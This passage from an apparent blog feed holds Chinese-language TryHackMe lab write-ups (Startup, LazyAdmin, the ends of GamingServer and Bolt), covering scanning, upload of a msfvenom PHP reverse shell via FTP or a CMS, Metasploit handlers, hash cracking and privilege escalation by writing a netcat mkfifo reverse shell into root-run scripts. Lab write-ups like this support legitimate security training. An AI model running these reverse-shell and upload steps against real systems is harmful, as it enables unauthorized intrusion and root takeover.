class="built_in">id</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161123649-1743013902.png" alt="image-20241006161122252"></p><p>进入容器之后，定位到<code>/mnt/root</code>即可查看目标主机设备的所有资源。运行了Bash脚本之后，我们将得到一个特殊的Shell，也就是容器的Shell。这个容器中包含了目标主机的全部资源</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241006161422968-662607515.png" alt="image-20241006161421526"></p><p>最后在<code>/mnt/root/root</code>下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之GamingServer</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Startup</title>
    <link href="https://www.fomal.cc/posts/d57c7ddd.html"/>
    <id>https://www.fomal.cc/posts/d57c7ddd.html</id>
    <published>2024-10-01T11:35:50.000Z</published>
    <updated>2024-10-07T07:34:15.997Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.45.30</p><p>攻击机ip： 10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code> nmap -sS -sV -sC 10.10.45.30</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 19:41 CST</span><br><span class="line">mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 10.10.45.30</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]</span><br><span class="line">| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg</span><br><span class="line">|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt</span><br><span class="line">| ftp-syst:</span><br><span class="line">|   STAT:</span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 10.11.101.220</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)</span><br><span class="line">|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)</span><br><span class="line">|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Maintenance</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds</span><br></pre></td></tr></table></figure><p>发现存在21，22，80端口，其中21端口可以匿名登录</p><h2 id="21端口">21端口</h2><p>直接匿名登录</p><p><code>ftp anonymous@10.10.45.30</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194636259-1717138662.png" alt="image-20241001194628456"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001194933862-1716586471.png" alt="image-20241001194926284"></p><p>发现存在一些文件全部<code>get</code>下来，其中<code>ftp</code>目录是空的</p><h2 id="ftp文件分析">ftp文件分析</h2><ul><li><code>important.jpg</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195241174-1196545580.png" alt="image-20241001195233137"></p><p>没啥用</p><ul><li><code>notice.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195329943-334597323.png" alt="image-20241001195322711"></p><p>看样子貌似跟下载文件有关？（并不确定）</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001195527538-1538863478.png" alt="image-20241001195519953"></p><p>首页什么也没有，直接扫目录</p><p><code>gobuster dir -u http://10.10.45.30/ -w /usr/share/wordlists/dirb/common.txt -z</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200104194-693790804.png" alt="image-20241001200056829"></p><p>发现存在<code>/files</code>路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001200145197-2050816862.png" alt="image-20241001200137927"></p><p>发现是我们通过<code>ftp</code>匿名登录获得的内容</p><h1>获取主机权限</h1><h2 id="MSF获取普通权限">MSF获取普通权限</h2><p>发现在<code>ftp</code>中的文件可以在<code>http</code>中访问到，所以我们就可以通过<code>ftp</code>上传木马，通过<code>http</code>执行，从而获得服务器的权限</p><p>在之前我们从<code>ftp</code>下载文件的时候发现<code>ftp</code>目录是具有可写权限的，所以我们就通过这个目录上传文件</p><p>先生成一个php反弹shell的木马</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201240718-6841116.png" alt="image-20241001201232855"></p><p>将该木马传到机器的ftp目录下，此时通过http可以查看到此文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201325202-1889182470.png" alt="image-20241001201317928"></p><p>使用msf创建一个监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# 使用 exploit/multi/handler 模块</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# 设置php的攻击负载payload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201533813-1700211541.png" alt="image-20241001201526055"></p><p>将参数设置好</p><p><code>set LHOST  10.11.101.220</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201702538-1525155851.png" alt="image-20241001201655307"></p><p><code>run</code>启动</p><p>在http上点击<code>shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201750120-518358356.png" alt="image-20241001201742671"></p><p>msf回连成功</p><p>利用<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>拿到交互式shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001201904169-1947917994.png" alt="image-20241001201856845"></p><p><img src="C:/Users/lemon/AppData/Roaming/Typora/typora-user-images/image-20241001201949796.png" alt="image-20241001201949796"></p><p>在<code>/home</code>目录下发现<code>lennie</code>目录，但是我们没有权限访问</p><h2 id="Wireshark流量分析">Wireshark流量分析</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202229662-246877002.png" alt="image-20241001202222169"></p><p>在根目录发现一些文件，查看一下</p><ul><li><code>recipe.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202335325-965983582.png" alt="image-20241001202328035"></p><p>还是没有什么可以利用的信息，继续查看别的内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202451791-1921428504.png" alt="image-20241001202444169"></p><p>在一个我们可以访问的<code>incidents</code>文件夹中发现一个流量包，通过http将其下载到本地</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001202957544-1745101645.png" alt="image-20241001202949932"></p><p>将流量包转移至之前的ftp目录下，就可以通过http将文件下载到本地了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001203556445-214800003.png" alt="image-20241001203548668"></p><p>拿<code>Wireshark</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001204532595-900259921.png" alt="image-20241001204524749"></p><p>在流量包里发现疑似<code>lennie</code>用户的密码<code>c4ntg3t3n0ughsp1c3</code>，<code>ssh</code>尝试登陆一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205517574-1258939451.png" alt="image-20241001205510001"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001205657732-1629873569.png" alt="image-20241001205650490"></p><p>在<code>/home/lennie</code>目录下找到<code>user.txt</code></p><h1>权限提升</h1><p>继续寻找其他信息，在<code>/home/lennie/Documents</code>下发现一些<code>txt</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210158295-521315857.png" alt="image-20241001210151013"></p><p>在<code>/home/lennie/scripts</code>下找到<code>sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210347977-2088833048.png" alt="image-20241001210340532"></p><p>查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210321820-713500301.png" alt="image-20241001210314585"></p><p>继续查看一下<code>/etc/print.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210437858-314517372.png" alt="image-20241001210430409"></p><p>我们又可以写入反弹的shell到<code>/etc/print.sh</code>文件中，然后通过<code>planner.sh</code>调用来获得root权限</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/print.sh</code></p><p>执行将上述命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210720380-89700049.png" alt="image-20241001210713124"></p><p>起一个新的监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210754289-499424149.png" alt="image-20241001210747046"></p><p>几乎是瞬间就接受到了反弹的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001210940417-178874238.png" alt="image-20241001210932745"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001211024288-765111761.png" alt="image-20241001211016797"></p><p>直接在当前目录就找到了<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Startup</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-LazyAdmin</title>
    <link href="https://www.fomal.cc/posts/986850d6.html"/>
    <id>https://www.fomal.cc/posts/986850d6.html</id>
    <published>2024-10-01T05:21:11.000Z</published>
    <updated>2024-10-07T07:34:23.295Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.36.50</p><p>攻击机ip：10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.36.50 -o out.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 13:28:01 2024 as: nmap -sS -sV -sC -o out.txt 10.10.36.50</span><br><span class="line">Nmap scan report for 10.10.36.50</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)</span><br><span class="line">|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)</span><br><span class="line">|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Tue Oct  1 13:28:39 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds</span><br></pre></td></tr></table></figure><p>发现只有 22端口和80端口开放</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001133324081-920118799.png" alt="image-20241001133315429"></p><p>80端口是一个apache初始页面什么也没有，扫描一下目录</p><p><code>gobuster dir -u http://10.10.36.50/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001134445161-1128622157.png" alt="image-20241001134437572"></p><p>发现<code>/content</code>路由，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140344879-280931777.png" alt="image-20241001140337721"></p><p>发现是<code>SweetRice</code>站点，继续扫描目录</p><p><code>gobuster dir -u http://10.10.36.50/content -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140558172-1591267814.png" alt="image-20241001140550777"></p><p>这回发现了一些有意思的内容</p><p>在<code>/_themes</code>下，发现一些查看不了源码的php文件，并没有什么用</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140738542-1427503327.png" alt="image-20241001140731314"></p><p>在<code>/as</code>路由下找到登录口</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140820110-1638822951.png" alt="image-20241001140813239"></p><p><code>/attachment</code>路由下并没有什么信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001140902177-336260211.png" alt="image-20241001140855448"></p><p>这里直接看<code>/inc</code>路由</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141015730-1826348733.png" alt="image-20241001141008810"></p><p>很明显看到数据库备份文件夹，将里面的<code>sql</code>文件下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141141471-910671197.png" alt="image-20241001141134169"></p><p>发现该cms版本为1.5.1，且密码也有，用户名是<code>manager</code>，尝试hashcat破解密码，将密码保存为<code>passwd</code></p><p><code>hashcat -a 0 -m 0 passwd /usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141730815-751946977.png" alt="image-20241001141723708"></p><p>发现成功破解密码，密码是<code>Password123</code></p><p>尝试通过<code>as</code>路由登录<code>manager</code>账户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001141932514-1784118097.png" alt="image-20241001141925338"></p><p>登录成功，同时可以确认该cms版本号为1.5.1</p><h1>MSF获取权限</h1><p>启动msf，<code>search</code>一下该cms，看看能否有可以直接利用的漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142416137-2123494996.png" alt="image-20241001142409002"></p><p>很可惜，没有可以直接用的，但是<code>searchsploit</code>发现了可以利用的，其中<code>Backup Disclosure</code>我们之前手动实现了，并登陆到了后台</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001142447599-1728977571.png" alt="image-20241001142440531"></p><p>但是我们可以利用其他的，比如<code>Arbitrary File Upload</code>，我们可以通过这个漏洞上传shell，这里使用msf进行反弹shell</p><p>先使用msf创建一个监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler# 使用 exploit/multi/handler 模块</span><br><span class="line">set  payload php/meterpreter/reverse_tcp# 设置php的攻击负载payload</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143752057-1728671297.png" alt="image-20241001143744773"></p><p>将需要的选项填好</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001143817667-1736957141.png" alt="image-20241001143810923"></p><p>设置好监听器后，生成php反弹shell</p><p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.101.220   lport=4444 R&gt;shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001144930162-200383647.png" alt="image-20241001144922924"></p><p>在<code>http://10.10.36.50/content/as/?type=media_center</code>处，将文件传上去</p><p>传<code>.php</code>文件时，发现并没有反应，将文件后缀改为<code>.phtml</code>，成功上传</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001145344237-1734699769.png" alt="image-20241001145337432"></p><p>在msf中<code>run</code>执行，在点击当前页面的<code>shell.phtml</code>文件，此时发现shell成功弹回来了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150642271-505446254.png" alt="image-20241001150634947"></p><p>换成交互式shell</p><p><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001150826924-1862349482.png" alt="image-20241001150820149"></p><p>在<code>/home/itguy</code>下找到<code>user.txt</code></p><h1>权限提升</h1><p>输入<code>sudo -l</code>查看是否有可以利用了命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151250536-1508069797.png" alt="image-20241001151243232"></p><p>只发现了一条</p><p><code>(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl</code></p><p>查看一下<code>backup.pl</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151400028-565050480.png" alt="image-20241001151353310"></p><p>发现只是调用<code>/etc/copy.sh</code>文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151602948-2027858445.png" alt="image-20241001151555700"></p><p>通过仔细查看两个文件后发现，我们不能修改<code>backup.pl</code>但是可以改<code>/etc/copy.sh</code>文件的内容</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001151800210-1044518594.png" alt="image-20241001151753242"></p><p>查看<code>/etc/copy.sh</code>文件后发现，内容是反弹shell的命令，将其修改成自己的ip和port</p><p><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.11.101.220 4445 &gt;/tmp/f&quot; &gt;/etc/copy.sh</code></p><p>另起一个监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153450910-287086362.png" alt="image-20241001153444215"></p><p>在msf终端shell里执行命令</p><p><code>sudo /usr/bin/perl /home/itguy/backup.pl</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153547891-1980282670.png" alt="image-20241001153541191"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153900832-1299349622.png" alt="image-20241001153853757"></p><p>可以看到在新的shell里获得了root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241001153956587-989090601.png" alt="image-20241001153949813"></p><p>最后在<code>/root</code>下找到<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMe系列之LazyAdmin</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Bolt</title>
    <link href="https://www.fomal.cc/posts/a58b6669.html"/>
    <id>https://www.fomal.cc/posts/a58b6669.html</id>
    <published>2024-10-01T02:07:48.000Z</published>
    <updated>2024-10-06T08:25:34.002Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.48.19</p><p>攻击机ip：10.11.101.220</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.48.19</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.94SVN scan initiated Tue Oct  1 10:13:36 2024 as: nmap -sS -sV -sC -o out.txt 10.10.48.19</span><br><span class="line">Nmap scan report for 10.10.48.19</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)</span><br><span class="line">|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)</span><br><span class="line">|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">8000/tcp open  http    (PHP 7.2.32-1)</span><br><span class="line">|_http-title: Bolt | A hero is unleashed</span><br><span class="line">|_http-generator: Bolt</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">|     Cache-Control: private, must-revalidate</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     pragma: no-cache</span><br><span class="line">|     expires: -1</span><br><span class="line">|     X-Debug-Token: 5d427e</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span><br><span class="line">|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;generator&quot; content=&quot;Bolt&quot;&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     href=&quot;#main-content&quot; class=&quot;vis</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1</span><br><span class="line">|     Cache-Control: public, s-maxage=600</span><br><span class="line">|     Date: Tue, 01 Oct 2024 02:14:09 GMT</span><br><span class="line">|     Content-Type: text/html; charset=UTF-8</span><br><span class="line">|     X-Debug-Token: cc4424</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en-GB&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;</span><br><span class="line">|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/bulma.css?8ca0842ebb&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/theme/base-2018/css/theme.css?6cb66bfe9f&quot;&gt;</span><br><span class="line">|     &lt;meta name=&quot;generator&quot; content=&quot;Bolt&quot;&gt;</span><br><span class="line">|     &lt;link rel=&quot;canonical&quot; href=&quot;http://0.0.0.0:8000/&quot;&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|_    &lt;body class=&quot;front&quot;&gt;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8000-TCP:V=7.94SVN%I=7%D=10/1%Time=66FB5AEF%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GetRequest,29E1,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Tue,\x2001\x20Oct\</span><br><span class="line">SF:x202024\x2002:14:09\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20</span><br><span 